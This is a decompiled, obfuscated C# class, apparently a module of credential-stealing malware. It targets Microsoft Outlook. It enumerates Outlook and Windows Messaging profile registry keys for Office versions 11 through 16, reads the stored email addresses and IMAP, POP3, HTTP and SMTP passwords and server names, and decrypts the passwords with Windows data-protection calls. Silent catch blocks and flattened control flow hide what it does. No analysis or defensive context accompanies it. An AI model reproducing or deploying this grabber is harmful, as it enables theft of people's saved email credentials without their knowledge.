using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using SNt;
using p3N5Y;

namespace ZAZUx;

public class gcBqRSSLu : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string DFDJ3EW
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public gcBqRSSLu()
	{
		DFDJ3EW = "Outlook";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			string text = "9375CFF0413111d3B88A00104B2A6676";
			RegistryKey[] array = new RegistryKey[7]
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\11.0\\Outlook\\Profiles"),
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\12.0\\Outlook\\Profiles"),
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\14.0\\Outlook\\Profiles"),
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles"),
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles"),
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"),
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles")
			};
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			RegistryKey[] array2 = array;
			foreach (RegistryKey registryKey in array2)
			{
				if (registryKey == null)
				{
					continue;
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string text2 in subKeyNames)
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(text2 + "\\" + text);
					if (registryKey2 == null)
					{
						continue;
					}
					string[] subKeyNames2 = registryKey2.GetSubKeyNames();
					foreach (string name in subKeyNames2)
					{
						using RegistryKey registryKey3 = registryKey2.OpenSubKey(name);
						try
						{
							if (registryKey3.GetValue("Email") == null || (registryKey3.GetValue("IMAP Password") == null && registryKey3.GetValue("POP3 Password") == null && registryKey3.GetValue("HTTP Password") == null && registryKey3.GetValue("SMTP Password") == null))
							{
								continue;
							}
							string text3 = "";
							ii68 ii69 = new ii68();
							ii69.S8v = ((registryKey3.GetValue("Email").GetType() == typeof(string)) ? ((string)registryKey3.GetValue("Email")).Replace("\0", string.Empty) : uTF8Encoding.GetString((byte[])registryKey3.GetValue("Email")).Replace("\0", string.Empty));
							string[] array3 = new string[4] { "IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password" };
							string[] array4 = array3;
							foreach (string text4 in array4)
							{
								if (registryKey3.GetValue(text4) != null)
								{
									ii69._9H5rP7hg2 = _3Vu2WEb((byte[])registryKey3.GetValue(text4)).Replace("\0", string.Empty);
									text3 = text4.Split(new char[1] { ' ' })[0];
									break;
								}
							}
							string name2 = text3 + " Server";
							ii69.byIdLuuGZbL = ((registryKey3.GetValue(name2).GetType() == typeof(string)) ? ((string)registryKey3.GetValue(name2)).Replace("\0", string.Empty) : uTF8Encoding.GetString((byte[])registryKey3.GetValue(name2)).Trim(new char[1] { Convert.ToChar(0) }));
							ii69.oVAe = DFDJ3EW;
							list.Add(ii69);
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	private static string _3Vu2WEb(byte[] _69PRwWmO)
	{
		int num = 0;
		byte[] array = default;
		string text2 = default;
		do
		{
			if (num == 1)
			{
				array = new byte[_69PRwWmO.Length - 1];
				num = 2;
			}
			if (num == 2)
			{
				Buffer.BlockCopy(_69PRwWmO, 1, array, 0, _69PRwWmO.Length - 1);
				num = 3;
			}
			if (num == 4)
			{
				string text = text2;
				char[] trimChars = new char[1];
				text2 = text.Trim(trimChars);
				num = 5;
			}
			if (num == 3)
			{
				text2 = ctLlKJA7.Lbl(array, (DataProtectionScope)0);
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		return text2;
	}
}
